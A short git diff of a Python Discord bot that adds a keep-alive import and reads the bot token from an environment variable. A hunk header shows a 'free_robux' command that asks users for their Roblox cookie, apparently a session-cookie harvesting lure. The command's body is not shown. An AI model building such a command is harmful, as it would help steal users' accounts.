@@ -1,7 +1,10 @@
+import os
 import requests
 import discord
 from discord.ext import commands
 import time
+from keep_alive import keep_alive
+keep_alive()
 
 class Bot(commands.Bot):
     def __init__(self, intents: discord.Intents, **kwargs):
@@ -111,4 +114,4 @@ async def free_robux(interaction: discord.Interaction, 로블록스_쿠키: str)
         # Handle the error appropriately (e.g., log it, send a message, etc.)
 
 # Token should be kept secure, not hardcoded in the script
-bot.run(process.env.TOKEN)
+bot.run(os.environ.get('token'))
